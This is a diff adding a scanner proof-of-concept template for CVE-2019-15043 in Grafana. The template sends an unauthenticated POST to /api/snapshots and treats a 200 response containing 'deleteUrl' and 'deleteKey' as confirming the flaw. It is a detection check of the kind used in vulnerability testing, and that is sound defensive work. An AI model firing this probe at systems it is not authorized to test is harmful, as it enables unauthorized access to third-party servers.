@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "验证目标 Grafana 实例是否存在未授权快照创建漏洞，通过向 /api/snapshots 端点发送未认证 POST 请求检测访问控制缺陷"
+id = "POC-AVE-2019-0085"
+name = "Grafana HTTP API Improper Access Control PoC"
+severity = "high"
+tags = ["ave-2019-0085"]
+vuln_id = [
+    "CVE-2019-15043",
+    "AVE-2019-0085",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/snapshots"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"dashboard": {"name":"AVE-PoC-Test"}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["deleteUrl"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["deleteKey"]
